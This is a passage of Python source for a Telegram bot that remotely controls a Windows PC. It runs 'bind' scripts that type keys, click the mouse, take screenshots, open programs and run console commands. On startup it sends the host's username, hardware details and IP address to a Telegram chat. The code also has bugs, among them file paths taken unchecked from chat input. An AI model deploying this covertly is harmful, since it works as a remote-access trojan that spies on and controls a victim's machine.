        bot.send_message(message.chat.id, f'ü§® *–£–¥–∞–ª—è—é {message.text.strip()}.txt!*', parse_mode='Markdown')
        os.remove(f"binds\\{message.text.strip()}.txt")
        return bind_menu(message)
        
    bot.send_message(message.chat.id, 'üòÆ *–î–∞–Ω–Ω–æ–≥–æ –±–∏–Ω–¥–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode='Markdown')
    return bind_menu(message)

def choose_bind(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, 'üòè *–í—ã –≤ –º–µ–Ω—é –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –±–∏–Ω–¥–∞–º–∏!\n–í–≤–µ–¥–∏—Ç–µ –∏–º—è —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ –±–∏–Ω–¥–∞ –¥–ª—è –µ–≥–æ –æ—Ç–∫—Ä—ã—Ç–∏—è*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, bind_read)


def bind_read(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip == "/start": return start(message)
    elif message.text.strip == "–ù–∞–∑–∞–¥": return bind_menu(message)

    if os.path.isfile(f"binds\\{message.text.strip()}.txt") == False:
        bot.send_message(message.chat.id, 'üòÆ *–î–∞–Ω–Ω–æ–≥–æ –±–∏–Ω–¥–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode='Markdown')
        return bind_menu(message)
        
    bind_menu(message)
    bot.send_message(message.chat.id, f'ü§® *–ó–∞–ø—É—Å–∫–∞—é {message.text.strip()}.txt!*', parse_mode='Markdown')    

    file = open(f"binds\\{message.text.strip()}.txt", "r", encoding='utf8')
    text = file.read()
    code = text.split("\n")

    for i in code:
        try:
            if i.startswith('//') or i == '': continue

            elif i.startswith('wait'): 
                if bindAPI.setWait(bindAPI(), int(i.split('=', maxsplit=1)[1])) is not None: break

            elif i.startswith('writeKeyboard'):
                if bindAPI.writeKeyboard(bindAPI(), i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('useKeyboard'):
                if bindAPI.useKeyboard(bindAPI(), i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('openSite'):
                if bindAPI.openSite(bindAPI(), i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('sendScreenshot'):
                if bindAPI.sendScreenshot(bindAPI(), int(i.split('=', maxsplit=1)[1])) is not None: break

            elif i.startswith('openProgram'):
                if bindAPI.openProgram(bindAPI(), i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('clickMouse'):
                if bindAPI.clickMouse(bindAPI(), i.split('=', maxsplit=1)[1]) is not None: break
            
            elif i.startswith('setCursor'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if bindAPI.setCursor(bindAPI(), int(funcCode[0]), int(funcCode[1])) is not None: break

            elif i.startswith('sendMessage'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if bindAPI.sendMessage(bindAPI(), int(funcCode[0]), funcCode[1]) is not None: break

            elif i.startswith('useConsole'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if bindAPI.useConsole(bindAPI(), int(funcCode[0]), funcCode[1]) is not None: break

            return bot.send_message(chat_id, f"*‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:\n{i}\n–î–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*", parse_mode='Markdown')

        except IndexError: return bot.send_message(chat_id, f"*‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:\n{i}\n–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã —Å—Ç—Ä–æ–∫–∏!*", parse_mode='Markdown')
        
    return bot.send_message(message.chat.id, '‚òëÔ∏è *–ë–∏–Ω–¥ –±—ã–ª —É—Å–ø–µ—à–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω!*', parse_mode='Markdown')

if __name__ == '__main__':
    startup_time = datetime.now()
    message = bot.send_message(chat_id, f'üßê –ë–æ—Ç –±—ã–ª –≥–¥–µ-—Ç–æ –∑–∞–ø—É—â–µ–Ω! \n\n‚è∞ –¢–æ—á–Ω–æ–µ –≤—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: *{startup_time}*\nüíæ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - *{login}*\nü™ë –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ - *{oper[0]} {oper[2]} {oper[3]}*\nüßÆ –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä - *{oper[5]}*\nüòª –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å: *–î–æ—Å—Ç—É–ø–Ω–æ {int(virtual_memory[0] / 1e+9)} –ì–ë | –ó–∞–≥—Ä—É–∂–µ–Ω–æ {virtual_memory[2]}%*\nüîã –ë–∞—Ç–∞—Ä–µ—è –∑–∞—Ä—è–∂–µ–Ω–∞ –Ω–∞ *{battery}%*\nüñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞ - *{width}x{height}*\nüìÄ –ü–∞–º—è—Ç—å: ' + '*{:6.2f}* –ì–ë'.format(total_mem/gb) + " –≤—Å–µ–≥–æ, –æ—Å—Ç–∞–ª–æ—Å—å *{:6.2f}* –ì–ë".format(free_mem/gb) + f'\nüîë IP –∞–¥—Ä–µ—Å –∑–∞–ø—É—Å—Ç–∏–≤—à–µ–≥–æ - *{str(ip)[2:-1]}*', parse_mode="Markdown")
    mainmenu(message)
    print(f"{startup_time} | –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º v.{VERSION} —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω–æ!")
    bot.infinity_polling(none_stop = True)
